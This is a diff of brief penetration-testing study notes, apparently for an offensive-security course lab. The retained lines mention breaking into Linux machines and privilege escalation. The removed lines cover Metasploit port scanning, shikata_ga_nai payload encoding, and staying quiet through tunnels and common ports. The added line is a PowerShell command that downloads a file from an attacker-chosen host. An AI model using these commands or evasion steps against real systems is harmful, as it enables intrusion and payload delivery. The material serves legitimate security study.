@@ -146,13 +146,4 @@ find linux machines
 break into as many as possible
 look into priv esc
 
-use auxiliary/scanner/portscan/tcp
-
-set EnableStageEncoding true
-set StageEncoder x86/shikata_ga_nai
-
-always try and figure out ways to be quiet
-use encryption, tunnels, known ports, i.e 80, 443 etc
-
-scan every machine in network
-spend time with nmap
+powershell -c "(new-object System.Net.Webclient).DownloadFile('http://$ip/$file','C:\Users\offsec\Desktop\$file')"
